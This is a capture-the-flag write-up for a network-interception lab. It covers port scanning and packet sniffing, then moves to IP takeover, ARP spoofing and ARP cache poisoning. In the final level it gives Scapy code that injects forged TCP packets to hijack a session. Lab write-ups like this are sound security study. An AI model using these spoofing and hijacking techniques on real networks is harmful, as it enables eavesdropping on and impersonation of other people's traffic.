# Intercepting Communication
- *level 1*: connect to a host, we can use `nc <IP> <PORT>`
- *level 2*: listen to a port `nc -l <PORT>`
- *level 3*: use `nmap` to scan a subnetwork, `nmap -p 31337 10.0.0.0/24`, and find the hosts that are up
- *level 4*: the subnetwork is larger, use Python to scan the network with multi-threading, to avoid creating too many threads, use a thread pool. We can also set `--max-parallelism` and `--min-parallelism` in `nmap`: `nmap -T5 --min-parallelism 200 --max-parallelism -p <PORT> <SUBNETWORK>`
- *level 5*: `tcpdump -i any port <PORT> -A`, the flag is in the data field of the packets
- *level 6*: this time, each packet will contain at most 1 byte of the flag, use Python and `Scapy` to sniff the packets to the specified port, and concatenate the characters in the payload, then we will get the flag
- *level 7*: `10.0.0.4` is communicating with `10.0.0.2: 31337`, we can change our IP address `ifconfig eth0 10.0.0.2`, then listen to port `31337` and get the flag
- *level 8*: we can use `arping 10.0.0.3` to get the MAC address of the host, then `sendp(Ether(dst = '1e:5f:b7:14:a6:0e', src = 'ce:25:29:b2:bc:99', type=0xFFFF), iface = 'eth0')`, it is important to specify `iface`, I didn't get the flag until I include this parameter
- *level 9*: 
    ```
    eth = Ether(dst = 'ff:ff:ff:ff:ff:ff', src = get_if_hwaddr('eth0'))
    ip = IP(dst = '10.0.0.3', proto = 0xFF)
    pkt = eth / ip
    sendp(pkt, iface = 'eth0')
    ```
- *level 10*: 
    ```
    eth = Ether(dst = 'ff:ff:ff:ff:ff:ff', src = get_if_hwaddr('eth0'))
    ip = IP(dst = '10.0.0.3')
    tcp = TCP(sport=31337, dport=31337, seq=31337, ack=31337, flags='APRSF')
    pkt = eth / ip / tcp
    sendp(pkt, iface = 'eth0')
    ```
- *level 11*: `Scapy` is run in user space, however, the `SYN+ACK` packet will first get to the kernel, and it will send a `RST` packet to reset this connection. Initially, I thought this is the reason why I cannot capture the SYN+ACK packet in my program. However, I finally realized that the problem is caused by the small time window between I sent the first SYN packet and invoke `sniff()`, i.e., the SYN+ACK arrived within this time window. To solve this problem, we can use multi-threading, i.e., we start the `sniff()` function in another thread first, then we send the initial SYN packet, and we will be able to capture everything after that
    ```
    sniff_thread = threading.Thread(target=sniffing_function)
    sniff_thread.start()
    initial_SYN()
    ```
- *level 12*: send an ARP reply
    ```
    eth = Ether(dst = 'a2:bb:52:d2:69:a5', src = get_if_hwaddr('eth0'))
    arp = ARP(op = 2, psrc = get_if_addr('eth0'), pdst = '10.0.0.3', hwsrc = '86:55:bf:5b:5c:a0') # op: 2 is-at
    pkt = eth / arp
    pkt.show()
    sendp(pkt, iface = 'eth0')
    ```
- *level 13*: broadcast 2 ARP requests with our MAC address, the first one impersonates `10.0.0.2` to poison the ARP cache of `10.0.0.4`, the second one impersonates `10.0.0.4` to poison the ARP cache of `10.0.0.2`, then we can sniff packets and find the flag in one of them
- *level 14*: first, perform an ARP poisoning to be able to sniff the communication between 2 victims. Then by observing the payload of the TCP packets, we can know that each round, the server will ask for a `SECRET`, the client will send the value of the `SECRET`, then the server will print all commands, the client can send one of them to the server, and finally the server sends back the response. To get the flag, we need to send the command `b'FLAG\n'` to the server. In order to bypass the secret check, we just need to impersonate the client and send a packet right after the server sends all commands, but before the real client sends any command
    ```
    if(packet[IP].src == '10.0.0.3' and raw_data == b'COMMANDS:\nECHO\nFLAG\nCOMMAND:\n'):
        ip   = IP(src = '10.0.0.4', dst = '10.0.0.3')
        tcp  = packet[TCP].copy()
        del tcp[Raw] # it is important to delete the original payload
        tcp.sport = packet[TCP].dport
        tcp.dport = packet[TCP].sport
        tcp.seq   = packet[TCP].ack
        tcp.ack   = packet[TCP].seq + len(raw_data)
        tcp.chksum = None # this will make Scapy recalculate the checksum 
        data = b'FLAG\n'
        pkt  = ip / tcp / data
        send(pkt, iface = 'eth0')
    ```
